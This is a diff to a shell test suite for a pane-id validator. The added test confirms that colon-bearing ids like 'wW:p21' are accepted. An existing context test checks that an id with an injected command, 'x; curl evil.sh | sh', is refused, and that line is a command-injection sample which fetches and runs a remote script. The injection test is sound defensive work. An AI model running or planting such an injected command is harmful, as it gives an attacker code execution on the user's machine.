@@ -104,6 +104,15 @@ macos-banner async" ]
   [ "$status" -eq 0 ]
 }
 
+@test "a herdr pane id is safe, colon and all, or no banner can focus a pane" {
+  # herdr's real ids look like wW:p21. The allowlist omitted the colon, so
+  # EVERY banner on this host dropped its pane and lost click-to-focus, the
+  # feature the pane id exists for. A colon is inert in a shell word: it is
+  # not an operator, and the danger set is ; | & $ ` newline and quotes.
+  run pns_pane_is_safe 'wW:p21'
+  [ "$status" -eq 0 ]
+}
+
 @test "a pane id carrying shell metacharacters is refused" {
   run pns_pane_is_safe 'x; curl evil.sh | sh'
   [ "$status" -eq 1 ]
